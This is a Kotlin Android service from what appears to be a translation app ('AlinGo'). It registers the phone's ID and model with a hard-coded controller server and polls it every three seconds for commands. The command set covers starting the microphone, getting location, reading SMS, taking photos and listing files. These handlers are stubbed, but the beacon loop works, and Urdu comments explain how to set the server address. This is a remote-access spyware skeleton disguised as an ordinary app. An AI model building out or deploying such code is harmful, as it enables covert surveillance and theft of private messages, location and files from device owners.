package com.alingo.translate.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import com.alingo.translate.MainActivity
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

class AgentService : Service() {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    // ⚠️ یہاں اپنے سرور کا IP یا URL ڈالیں
    // اگر آپ ٹرمکس میں لوکل چلا رہے ہیں اور فون اسی وائی فائی پر ہے:
    // تو اپنے PC/ٹرمکس کا IP ڈالیں (مثلاً: http://10.241.253.40:5000)
    // اگر کلاؤڈ پر ہے تو: https://your-server.com
    private val serverUrl = "http://10.241.253.40:5000"
    
    private val deviceId = "android-" + Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    private var isRunning = true

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1001, buildNotification())

        // سرور پر رجسٹر کریں اور پولنگ شروع کریں
        Thread {
            registerDevice()
            startPollingLoop()
        }.start()

        return START_STICKY
    }

    private fun registerDevice() {
        val json = JSONObject().apply {
            put("device_id", deviceId)
            put("device_name", Build.MODEL)
        }
        val body = json.toString().toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url("$serverUrl/api/register")
            .post(body)
            .build()

        try {
            val response = client.newCall(request).execute()
            Log.d("AlinGoAgent", "Register: ${response.body?.string()}")
        } catch (e: IOException) {
            Log.e("AlinGoAgent", "Register failed: ${e.message}")
        }
    }

    private fun startPollingLoop() {
        while (isRunning) {
            try {
                val request = Request.Builder()
                    .url("$serverUrl/api/poll/$deviceId")
                    .get()
                    .build()

                val response = client.newCall(request).execute()
                val bodyString = response.body?.string()

                if (bodyString != null) {
                    val json = JSONObject(bodyString)
                    if (!json.isNull("command")) {
                        val command = json.getString("command")
                        Log.d("AlinGoAgent", "Received: $command")
                        executeCommand(command)
                    }
                }
            } catch (e: Exception) {
                Log.e("AlinGoAgent", "Poll error: ${e.message}")
            }
            Thread.sleep(3000) // ہر 3 سیکنڈ بعد
        }
    }

    private fun executeCommand(command: String) {
        when (command) {
            "PING" -> Log.d("AlinGoAgent", "PONG")
            "START_MIC" -> { /* MicHandler.start(this) */ }
            "STOP_MIC" -> { /* MicHandler.stop() */ }
            "GET_LOCATION" -> { /* LocationHandler.get(this) */ }
            "GET_SMS" -> { /* SmsHandler.get(this) */ }
            "TAKE_PHOTO" -> { /* CameraHandler.capture(this) */ }
            "GET_FILES" -> { /* FileHandler.list(this) */ }
        }
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, "AgentChannel")
                .setContentTitle("AlinGo Agent Active")
                .setContentText("Connected to controller.")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .build()
        } else {
            Notification.Builder(this)
                .setContentTitle("AlinGo Agent Active")
                .setContentText("Connected to controller.")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .build()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("AgentChannel", "AlinGo Agent", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
